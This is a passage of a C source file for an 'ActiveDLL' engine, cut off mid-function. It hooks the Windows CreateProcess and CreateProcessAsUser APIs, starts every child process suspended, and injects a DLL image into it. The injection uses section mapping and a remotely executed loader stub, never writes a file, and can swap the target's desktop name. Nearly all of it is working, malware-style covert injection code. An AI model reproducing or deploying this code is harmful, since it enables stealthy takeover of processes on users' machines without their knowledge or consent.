//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ActiveDLL project. Version 1.4
//	
// module: activdll.c
// $Revision: 191 $
// $Date: 2014-07-11 16:52:10 +0400 (Пт, 11 июл 2014) $
// description: 
//	Active DLL engine.
//  Injects a specified DLL into every child process that started by a current process.
//  Currently four hooks used: CreateProcess(A and W), CreateProcessAsUser(A and W). This is for creating all processes suspended and 
//   resuming'em after injectin' the DLL.

#include "..\common\common.h"
#include "activdll.h"
#include "image.h"


#define	PROCESS_WAIT_TIME	6000	// How long we have to wait for a process to initialize (milliseconds)
#define	PROCESS_CHECK_TIME	300		// An interval to check if process already initialized (milliseconds)

#define	szLdrLoadDll				"LdrLoadDll"
#define	szLdrGetProcedureAddress	"LdrGetProcedureAddress"
#define	szNtProtectVirtualMemory	"NtProtectVirtualMemory"



// --- Globals -------------------------------------------------------------------------------------------------------------


//#define _CALL_IMPORT	TRUE	// Call originally imported function from the IAT, instead of calling saved original pointer.

static AD_CONTEXT						g_CurrentAdContext = {0};
static PROCESS_IMPORT					g_DefaultImport = {0};
static PROCESS_IMPORT					g_DefaultImportArch = {0};

AC_CHANGE_DESKTOP_NAMEA_CALLBACK		g_pChangeDesktopNameA = NULL;
AC_CHANGE_DESKTOP_NAMEW_CALLBACK		g_pChangeDesktopNameW = NULL;
AC_ON_CREATE_PROCESSA_CALLBACK			g_pOnCreateProcessA = NULL; 
AC_ON_CREATE_PROCESSW_CALLBACK			g_pOnCreateProcessW = NULL;
AC_ON_THREAD_CALLBACK					g_pOnThreadAttach = NULL;
AC_ON_THREAD_CALLBACK					g_pOnThreadDetach = NULL;



// Variables


typedef BOOL (_stdcall* ptr_CreateProcessW)(LPWSTR lpApplicationName,	LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, 
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, 
				LPWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

typedef BOOL (_stdcall* ptr_CreateProcessA)(PCHAR lpApplicationName,	PCHAR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, 
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, 
				PCHAR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

typedef BOOL (_stdcall* ptr_CreateProcessAsUserA)(HANDLE hToken, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
				LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

typedef BOOL (_stdcall* ptr_CreateProcessAsUserW)(HANDLE hToken, LPWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
				LPWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

typedef HANDLE (_stdcall* ptr_CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress,
				LPVOID	lpParameter, DWORD	dwCreationFlags, LPDWORD lpThreadId );


// Predefinitions

BOOL WINAPI my_CreateProcessW(LPWSTR lpApplicationName,	LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, 
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, 
				LPWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

BOOL WINAPI my_CreateProcessA(PCHAR lpApplicationName,	PCHAR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, 
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, 
				PCHAR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

BOOL WINAPI my_CreateProcessAsUserA(HANDLE hToken, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
				LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

BOOL WINAPI my_CreateProcessAsUserW(HANDLE hToken, LPWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
				LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
				LPWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

HANDLE WINAPI my_CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T	dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress,
				LPVOID	lpParameter, DWORD	dwCreationFlags, LPDWORD lpThreadId);


INT CreateInjectThread(ULONG ProcessId);


#ifdef _KERNEL_MODE_INJECT
DECLARE_K32_HOOK(CreateThread);
#else
DECLARE_K32_HOOK(CreateProcessW);
DECLARE_K32_HOOK(CreateProcessA);
DECLARE_A32_HOOK(CreateProcessAsUserW);
DECLARE_A32_HOOK(CreateProcessAsUserA);

//win7
DECLARE_K32_HOOK(CreateProcessAsUserW);
DECLARE_K32_HOOK(CreateProcessAsUserA);
#endif

//////////////////////////////////////////////////////////////////////////

#ifdef _KERNEL_MODE_INJECT
DECLARE_NULL_HOOK(CreateThread);
#else
DECLARE_NULL_HOOK(CreateProcessW);
DECLARE_NULL_HOOK(CreateProcessA);
DECLARE_NULL_HOOK(CreateProcessAsUserW);
DECLARE_NULL_HOOK(CreateProcessAsUserA);
#endif

#define _NO_WND_HOOKS_

// Hook descriptors
static HOOK_DESCRIPTOR ProcIatHooks[] = {

#ifdef	_KERNEL_MODE_INJECT
	DEFINE_K32_IAT_HOOK(CreateThread),
#else
	DEFINE_K32_IAT_HOOK(CreateProcessW),
	DEFINE_K32_IAT_HOOK(CreateProcessA),
	DEFINE_A32_IAT_HOOK(CreateProcessAsUserW),
	DEFINE_A32_IAT_HOOK(CreateProcessAsUserA),
#endif
};

// Hook descriptors
static HOOK_DESCRIPTOR ProcIatHooksEx[] = {

#ifdef _KERNEL_MODE_INJECT
	DEFINE_NULL_IAT_HOOK(CreateThread),
#else
	DEFINE_NULL_IAT_HOOK(CreateProcessW),
	DEFINE_NULL_IAT_HOOK(CreateProcessA),
	DEFINE_NULL_IAT_HOOK(CreateProcessAsUserW),
	DEFINE_NULL_IAT_HOOK(CreateProcessAsUserA),
#endif
};

static HOOK_DESCRIPTOR ProcExportHooks[] = {

#ifdef _KERNEL_MODE_INJECT
	DEFINE_K32_EXP_HOOK(CreateThread),
#else
	DEFINE_K32_EXP_HOOK(CreateProcessW),
	DEFINE_K32_EXP_HOOK(CreateProcessA),
	DEFINE_A32_EXP_HOOK(CreateProcessAsUserW),
	DEFINE_A32_EXP_HOOK(CreateProcessAsUserA),
#endif
};


// Starting form Windows7 CreateProcessAsUserW moved from advapi32 to kernel32
static HOOK_DESCRIPTOR ProcExportHooksEx[] = {

#ifdef _KERNEL_MODE_INJECT
	DEFINE_K32_EXP_HOOK(CreateThread),
#else
	DEFINE_K32_EXP_HOOK(CreateProcessW),
	DEFINE_K32_EXP_HOOK(CreateProcessA),
	DEFINE_K32_EXP_HOOK(CreateProcessAsUserW),
	DEFINE_A32_EXP_HOOK(CreateProcessAsUserA),
#endif
};


//---- Hook functions --------------------------------------------------------------------------------------------------------

#ifndef _KERNEL_MODE_INJECT

BOOL WINAPI my_CreateProcessW(
	LPWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	BOOL	Ret;

	ENTER_HOOK();

	if (g_pOnCreateProcessW)
	{
		// We have caller-defined callback function here
		Ret = (g_pOnCreateProcessW)(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles,
			dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
	}
	else
	{
		ULONG	Flags = dwCreationFlags;

		dwCreationFlags |= CREATE_SUSPENDED;

#ifdef _CALL_IMPORT
		Ret = CreateProcessW(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
			dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#else
		ASSERT(hook_kernel32_CreateProcessW.Original);
		Ret = ((ptr_CreateProcessW)hook_kernel32_CreateProcessW.Original)(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
			dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#endif
		if (Ret)
			AcInjectDll(lpProcessInformation, Flags, _INJECT_AS_IMAGE);
	}
	
	LEAVE_HOOK();

	return(Ret);
}


BOOL WINAPI my_CreateProcessA(
	PCHAR lpApplicationName,
	PCHAR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	PCHAR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	BOOL	Ret;

	ENTER_HOOK();

	if (g_pOnCreateProcessA)
	{
		// We have caller-defined callback function here
		Ret = (g_pOnCreateProcessA)(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles,
			dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
	}
	else
	{
		ULONG	Flags = dwCreationFlags;

		dwCreationFlags |= CREATE_SUSPENDED;
	
#ifdef _CALL_IMPORT
		Ret = CreateProcessA(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
			dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#else
		Ret = ((ptr_CreateProcessA)hook_kernel32_CreateProcessA.Original)(lpApplicationName, lpCommandLine,	lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
			dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#endif

		if (Ret)
			AcInjectDll(lpProcessInformation, Flags, _INJECT_AS_IMAGE);
	}
	
	LEAVE_HOOK();

	return(Ret);
}


BOOL WINAPI my_CreateProcessAsUserA(
	HANDLE hToken,
	LPCSTR lpApplicationName,
	LPSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPCSTR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	ULONG	Flags = dwCreationFlags;
	BOOL	Res;
	LPSTR	szDesktopO = NULL, szDesktopN = NULL;

	ENTER_HOOK();

	dwCreationFlags |= CREATE_SUSPENDED;

	if ((g_pChangeDesktopNameA) && (szDesktopN = (g_pChangeDesktopNameA)(lpStartupInfo)))
	{
		szDesktopO = lpStartupInfo->lpDesktop;
		lpStartupInfo->lpDesktop = szDesktopN;
	}

#ifdef _CALL_IMPORT
	Res = CreateProcessAsUserA(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
		bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#else
	// Calling function by the pointer that was saved while we were setting hooks.
	//	This is because we import ADVAPI32 as delay import and addresses of it's functions are being resolved after the
	//	hooks were set so they can point to our hook functions instead of original ones.
	if (LOBYTE(LOWORD(g_SystemVersion)) > 6 || (LOBYTE(LOWORD(g_SystemVersion)) == 6 && HIBYTE(LOWORD(g_SystemVersion)) > 0))
	{
		// Win7
		Res = ((ptr_CreateProcessAsUserA) hook_kernel32_CreateProcessAsUserA.Original)(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
			bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
	}
	else
	{
		Res = ((ptr_CreateProcessAsUserA) hook_advapi32_CreateProcessAsUserA.Original)(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
			bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
	}
#endif

	if (szDesktopN)
	{
		if ( !Res )
		{
			DbgPrint("CreateProcessAsUserA %s->%s failed\n", szDesktopO, lpCommandLine ? lpCommandLine : "");
		}
		lpStartupInfo->lpDesktop = szDesktopO;
		AppFree ( szDesktopN );
	}

	if (Res)
		AcInjectDll(lpProcessInformation, Flags, _INJECT_AS_IMAGE);

	LEAVE_HOOK();
	return(Res);
}

BOOL WINAPI my_CreateProcessAsUserW(
	HANDLE hToken,
	LPWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{

	ULONG Flags = dwCreationFlags;
	BOOL Res;
	LPWSTR szDesktopN = NULL, szDesktopO = NULL;

	ENTER_HOOK();

	dwCreationFlags |= CREATE_SUSPENDED;

	if ((g_pChangeDesktopNameW) && (szDesktopN = (g_pChangeDesktopNameW)(lpStartupInfo)))
	{
		szDesktopO = lpStartupInfo->lpDesktop;
		lpStartupInfo->lpDesktop = szDesktopN;
	}

#ifdef _CALL_IMPORT
	Res = CreateProcessAsUserW(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
		bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
#else
	// Calling function by the pointer that was saved while we were setting hooks.
	//	This is because we import ADVAPI32 as delay import and addresses of it's functions are being resolved after the
	//	hooks were set so they can point to our hook functions instead of original ones.
	if (LOBYTE(LOWORD(g_SystemVersion)) > 6 || (LOBYTE(LOWORD(g_SystemVersion)) == 6 && HIBYTE(LOWORD(g_SystemVersion)) > 0))
	{
		// Win7
		Res = ((ptr_CreateProcessAsUserW) hook_kernel32_CreateProcessAsUserW.Original)(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
			bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
	}
	else
	{
		Res = ((ptr_CreateProcessAsUserW) hook_advapi32_CreateProcessAsUserW.Original)(hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes,
			bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
	}
#endif

	if (szDesktopN)
	{
		if ( !Res ){
			DbgPrint("CreateProcessAsUserW %S->%S failed\n", szDesktopO,lpCommandLine ? lpCommandLine : L"");
		}

		lpStartupInfo->lpDesktop = szDesktopO;
		AppFree ( szDesktopN );
	}

	if (Res)
		AcInjectDll(lpProcessInformation, Flags, _INJECT_AS_IMAGE);

	LEAVE_HOOK();
	return(Res);
}
#endif	// _KERNEL_MODE_INJECT

// ---- Functions -----------------------------------------------------------------------------------------------------------



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Writes specified amount of bytes from the specified buffer into spesified processes memory.
//  Sets PAGE_READWRITE attributes before writing and restores original after it's done.
//
static BOOL PatchProcessMemory(
					HANDLE	hProcess,
					PVOID	Address,
					PCHAR	Patch,
					ULONG	Bytes
					)
{
	BOOL	Ret = FALSE;
	ULONG	OldProtect;
	ULONG_PTR	bWritten;

	if (VirtualProtectEx(hProcess, Address, Bytes, PAGE_READWRITE, &OldProtect))
	{
		if (WriteProcessMemory(hProcess, Address, Patch, Bytes, &bWritten) && bWritten == Bytes)
			Ret = TRUE;
		VirtualProtectEx(hProcess, Address, Bytes, OldProtect, &OldProtect);
	}

	return(Ret);
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Returns specified process effective entry point address. I.e address where the process starts to execute. 
//	This can be either an address of entry point of the main process image or an address of first image TLS callback if any.
//
static ULONG_PTR	GetProcessEntry(HANDLE	hProcess, ULONG	Flags)
{
	ULONG_PTR	AddressOfCallbacks, TlsCallback, ProcessEntry = 0;
	PCHAR		Buffer;
	PCHAR		ModuleBase;
	SIZE_T		bRead;
	PIMAGE_DATA_DIRECTORY	pDataDir;
	IMAGE_TLS_DIRECTORY		TlsDir;

	do
	{
		if (!(Buffer = AppAlloc(PAGE_SIZE)))
			// Not enough memory
			break;

		// Resolving target process main module image base
		if (!(ModuleBase = PsSupGetProcessMainImageBase(hProcess)))
			break;

		// Calculating and loading image PE header
		if (!ReadProcessMemory(hProcess, ModuleBase, Buffer, PAGE_SIZE, &bRead))
			break;

		if (!ReadProcessMemory(hProcess, ModuleBase + ((PIMAGE_DOS_HEADER)Buffer)->e_lfanew, Buffer, PAGE_SIZE, &bRead))
			break;

		// Calculating process entry VA
		ProcessEntry = (ULONG_PTR)ModuleBase + PeSupGetOptionalField(Buffer, AddressOfEntryPoint);

		// Checking if there's a TLS directory present
		pDataDir = PeSupGetDirectoryEntryPtr(Buffer, IMAGE_DIRECTORY_ENTRY_TLS);

		if (!pDataDir->VirtualAddress || !pDataDir->Size)
			break;

		// Loading TLS directory
		if (!ReadProcessMemory(hProcess, (ModuleBase + pDataDir->VirtualAddress), &TlsDir, sizeof(IMAGE_TLS_DIRECTORY), &bRead))
			break;

#ifdef	_WIN64
		if (Flags & INJECT_WOW64_TARGET)
			AddressOfCallbacks = (ULONG_PTR)((PIMAGE_TLS_DIRECTORY32)&TlsDir)->AddressOfCallBacks;
		else
#endif
		AddressOfCallbacks = (ULONG_PTR)TlsDir.AddressOfCallBacks;

		// Checking if we have TLS callbacks table
		if (!AddressOfCallbacks)
			break;

		// Loading TLS callbacks table
		if (!ReadProcessMemory(hProcess, (PVOID)AddressOfCallbacks, Buffer, PAGE_SIZE, &bRead))
			break;

		// Checking if the table is not empty
		if (TlsCallback = *(PULONG_PTR)Buffer)
			// We have valid TLS callback pointer, this will be our effective entry point
			ProcessEntry = TlsCallback;

	} while(FALSE);

	if (Buffer)
		AppFree(Buffer);

	return(ProcessEntry);
}


//
//	Resolves import and initializes the specified PROCESS_IMPORT structure.
//
static WINERROR InitProcessImport(
	PPROCESS_IMPORT	pImport
	)
{
	WINERROR	Status = NO_ERROR;

	if (!g_DefaultImport.pLdrLoadDll || !g_DefaultImport.pLdrGetProcedureAddress || !g_DefaultImport.pNtProtectVirtualMemory)
	{
		Status = ERROR_PROC_NOT_FOUND;

		do	// not a loop
		{
			HMODULE	hNtdll;
			
			if (!(hNtdll = GetModuleHandleW(wczNtdll)))
				break;

			if (!(g_DefaultImport.pLdrLoadDll = (ULONGLONG)PsSupGetRealFunctionAddress(hNtdll, szLdrLoadDll)))
				break;

			if (!(g_DefaultImport.pLdrGetProcedureAddress = (ULONGLONG)PsSupGetRealFunctionAddress(hNtdll, szLdrGetProcedureAddress)))
				break;

			if (!(g_DefaultImport.pNtProtectVirtualMemory = (ULONGLONG)PsSupGetRealFunctionAddress(hNtdll, szNtProtectVirtualMemory)))
				break;

			Status = NO_ERROR;
		} while(FALSE);
	}	// f (!g_DefaultImport.pLdrLoadDll ||

	if (Status == NO_ERROR)
		memcpy(pImport, &g_DefaultImport, sizeof(PROCESS_IMPORT)); 

	return(Status);
}


//
//	Resolves import and initializes the specified PROCESS_IMPORT structure.
//
static WINERROR InitProcessImportArch(
	PPROCESS_IMPORT	pImport,
	HANDLE			hProcess
	)
{
	WINERROR	Status = NO_ERROR;

	if (!g_DefaultImportArch.pLdrLoadDll || !g_DefaultImportArch.pLdrGetProcedureAddress || !g_DefaultImportArch.pNtProtectVirtualMemory)
	{
		Status = ERROR_PROC_NOT_FOUND;

		do	// not a loop
		{
			if (!(g_DefaultImportArch.pLdrLoadDll = (ULONGLONG)PsSupGetProcessFunctionAddressArch(hProcess, szNtdll, szLdrLoadDll)))
				break;

			if (!(g_DefaultImportArch.pLdrGetProcedureAddress = (ULONGLONG)PsSupGetProcessFunctionAddressArch(hProcess, szNtdll, szLdrGetProcedureAddress)))
				break;

			if (!(g_DefaultImportArch.pNtProtectVirtualMemory = (ULONGLONG)PsSupGetProcessFunctionAddressArch(hProcess, szNtdll, szNtProtectVirtualMemory)))
				break;

			Status = NO_ERROR;
		} while(FALSE);
	}	// f (!g_DefaultImportArch.pLdrLoadDll ||

	if (Status == NO_ERROR)
		memcpy(pImport, &g_DefaultImportArch, sizeof(PROCESS_IMPORT)); 

	return(Status);
}


//
//	Injects current DLL image into the target process without creating a file.
//
static WINERROR AdInjectImage(
	LPPROCESS_INFORMATION lpProcessInformation,	// Target process and it's main thread information
	ULONG	InjectFlags							// Inject control flags	
	)
{
	WINERROR	Status = ERROR_UNSUCCESSFULL;
	PIMAGE_DOS_HEADER	Mz;
	PIMAGE_NT_HEADERS	Pe;
	ULONG	SizeOfImage, SizeOfSection;
	PCHAR	pTargetModule, SectionBase = NULL, RemoteBase = NULL;
	HANDLE	hSection = 0;
	PLOADER_CONTEXT	pLdrCtx, pRemoteCtx;
	PCHAR	pLoaderStub = (PCHAR)&LoadDllStub;

#ifdef _M_AMD64
	if (InjectFlags & INJECT_WOW64_TARGET)
	{
		pLoaderStub = (PCHAR)&LoadDllStubArch;
		pTargetModule = (PCHAR)g_CurrentAdContext.pModule32;
	}
	else
		pTargetModule = (PCHAR)g_CurrentAdContext.pModule64;
#else
	if (!(InjectFlags & INJECT_WOW64_TARGET) && (g_CurrentProcessFlags & GF_WOW64_PROCESS))
	{
		pLoaderStub = (PCHAR)&LoadDllStubArch;
		pTargetModule = (PCHAR)g_CurrentAdContext.pModule64;
	}
	else
		pTargetModule = (PCHAR)g_CurrentAdContext.pModule32;
#endif

	do	// not a loop
	{
		if (!pTargetModule)
		{
			DbgPrint("No module found for the target process (%u) architecture\n", lpProcessInformation->dwProcessId);
			Status = ERROR_FILE_NOT_FOUND;
			break;
		}	// if (!pTargetModule)

		Mz = (PIMAGE_DOS_HEADER)pTargetModule;
		Pe = (PIMAGE_NT_HEADERS)((PCHAR)Mz + Mz->e_lfanew);
	
		SizeOfImage = _ALIGN(PeSupGetOptionalField(Pe, SizeOfImage), PAGE_SIZE);
		SizeOfSection = SizeOfImage + sizeof(LOADER_CONTEXT) + g_CurrentAdContext.Module32Size + g_CurrentAdContext.Module64Size;

		// Creating a section for the image and mapping it into the current process
		if ((Status = ImgAllocateSection(SizeOfSection, &SectionBase, &hSection)) != NO_ERROR)
		{
			DbgPrint("Unable to allocate a section of %u bytes, error %u\n", SizeOfSection, Status);
			break;
		}
	
		// Mapping the section into the target process
		if ((Status = ImgMapSection(hSection, lpProcessInformation->hProcess, &RemoteBase)) != NO_ERROR)
		{
			DbgPrint("Unable to map the section into the target process, error %u\n",Status);
			break;
		}

		// Building the target image within the section
		if ((Status = ImgBuildImage(SectionBase, pTargetModule, RemoteBase)) != NO_ERROR)
		{
			DbgPrint("Failed building the target image, error %u\n", Status);
			break;
		}

		// Copying PE-modules into the section
		memcpy(SectionBase + SizeOfImage + sizeof(LOADER_CONTEXT), (PCHAR)g_CurrentAdContext.pModule32, g_CurrentAdContext.Module32Size);
		memcpy(SectionBase + SizeOfImage + sizeof(LOADER_CONTEXT) + g_CurrentAdContext.Module32Size, (PCHAR)g_CurrentAdContext.pModule64, g_CurrentAdContext.Module64Size);

		// Initializing loader context
		pLdrCtx = (PLOADER_CONTEXT)(SectionBase + SizeOfImage);
		pLdrCtx->ImageBase = (ULONGLONG)RemoteBase;

		// Initializing ADContext within the loader context
		pLdrCtx->AdContext.pModule32 = (ULONGLONG)(RemoteBase + SizeOfImage + sizeof(LOADER_CONTEXT));
		pLdrCtx->AdContext.pModule64 = (ULONGLONG)(RemoteBase + SizeOfImage + sizeof(LOADER_CONTEXT) + g_CurrentAdContext.Module32Size);
		pLdrCtx->AdContext.Module32Size = g_CurrentAdContext.Module32Size;
		pLdrCtx->AdContext.Module64Size = g_CurrentAdContext.Module64Size;

		// Initializing loader context import

#ifdef _M_AMD64
		if (InjectFlags & INJECT_WOW64_TARGET)
#else
		if (!(InjectFlags & INJECT_WOW64_TARGET) && (g_CurrentProcessFlags & GF_WOW64_PROCESS))
#endif
			Status = InitProcessImportArch(&pLdrCtx->Import, lpProcessInformation->hProcess);
		else
			Status = InitProcessImport(&pLdrCtx->Import);

		if (Status != NO_ERROR)
		{
			DbgPrint("Unable to resolve target process import, error %u\n", Status);
			break;
		}

#if _DEBUG
		// Some function addresses in DEBUG build could be addresses of JMPs to real functions.
		// Calculating real stub address here.
		if (*(PUCHAR)pLoaderStub == OP_JMP_NEAR) 
			pLoaderStub = (PVOID)((ULONG_PTR)pLoaderStub + *(PULONG)((PCHAR)pLoaderStub + sizeof(UCHAR)) + 5);
#endif
	
		memcpy(&pLdrCtx->LoaderStub, pLoaderStub, LOADER_STUB_MAX);
		pRemoteCtx = (PLOADER_CONTEXT)(RemoteBase + SizeOfImage);

		// Executing loader stub function within the target process
		Status = PsSupExecuteRemoteFunction(lpProcessInformation, &pRemoteCtx->LoaderStub, pRemoteCtx, InjectFlags);
	
	}	while(FALSE);

	if (SectionBase)
		ImgUnmapSection(NtCurrentProcess(), SectionBase);

	if (hSection)
		CloseHandle(hSection);

	return(Status);
}


#ifndef	_WIN64
// WOW64-only functions


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Writes specified amount of bytes from the specified buffer into spesified processes memory.
//  Sets PAGE_READWRITE attributes before writing and restores original after it's done.
//
static BOOL Wow64PatchProcessMemory64(
						HANDLE		hProcess,
						ULONGLONG	Address,
						PCHAR		Patch,
						ULONG		Bytes
						)
{
	BOOL	Ret = FALSE;
	NTSTATUS	ntStatus;

	ULONGLONG	bWritten, OldProtect, ProtAddress = Address, ProtBytes = Bytes, WriteBytes = Bytes;
	ULONGLONG	pZwProtectVirtualMemory = PsSupGetProcessFunctionAddressArch(GetCurrentProcess(), szNtdll, "ZwProtectVirtualMemory");
	ULONGLONG	pZwWriteVirtualMemory = PsSupGetProcessFunctionAddressArch(GetCurrentProcess(), szNtdll, "ZwWriteVirtualMemory");

	if (pZwProtectVirtualMemory && pZwWriteVirtualMemory)
	{
		ntStatus = Wow64NativeCall(pZwProtectVirtualMemory, 5, (ULONG64)hProcess, (ULONG64)&ProtAddress, (ULONG64)&ProtBytes, (ULONG64)PAGE_READWRITE, (ULONG64)&OldProtect);
		if (NT_SUCCESS(ntStatus))
		{
			ntStatus = Wow64NativeCall(pZwWriteVirtualMemory, 5, (ULONG64)hProcess, (ULONG64)Address, (ULONG64)Patch, (ULONG64)Bytes, (ULONG64)&bWritten);
			if (NT_SUCCESS(ntStatus))
				Ret = TRUE;
			Wow64NativeCall(pZwProtectVirtualMemory, 5, (ULONG64)hProcess, (ULONG64)&ProtAddress, (ULONG64)&ProtBytes, (ULONG64)OldProtect, (ULONG64)&OldProtect);
		}
	}
	return(Ret);
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Returns specified process effective entry point address. I.e address where the process starts to execute. 
//	This can be either an address of entry point of the main process image or an address of first image TLS callback if any.
//
static NTSTATUS	Wow64GetProcessEntry64(HANDLE hProcess, ULONGLONG* pProcessEntry)
{
	ULONGLONG	ModuleBase, TlsCallback, ProcessEntry = 0;
	NTSTATUS	ntStatus = STATUS_INSUFFICIENT_RESOURCES;
	PCHAR		Buffer;
	SIZE_T		bRead;
	PIMAGE_DATA_DIRECTORY	pDataDir;
	IMAGE_TLS_DIRECTORY		TlsDir;

	do 
	{
		if (!(Buffer = AppAlloc(PAGE_SIZE)))
		// Not enough memory
			break;

		ntStatus = PsSupGetProcessMainImageBaseArch(hProcess, &ModuleBase);
		if (!NT_SUCCESS(ntStatus))
			break;

		if (!PsSupReadProcessMemoryArch(hProcess, ModuleBase, Buffer, PAGE_SIZE, &bRead))
			break;

		if (!PsSupReadProcessMemoryArch(hProcess, ModuleBase + ((PIMAGE_DOS_HEADER)Buffer)->e_lfanew, Buffer, PAGE_SIZE, &bRead))
			break;

		ProcessEntry = ModuleBase + PeSupGetOptionalField(Buffer, AddressOfEntryPoint);

		pDataDir = PeSupGetDirectoryEntryPtr(Buffer, IMAGE_DIRECTORY_ENTRY_TLS);

		if (!pDataDir->VirtualAddress || !pDataDir->Size)
			break;

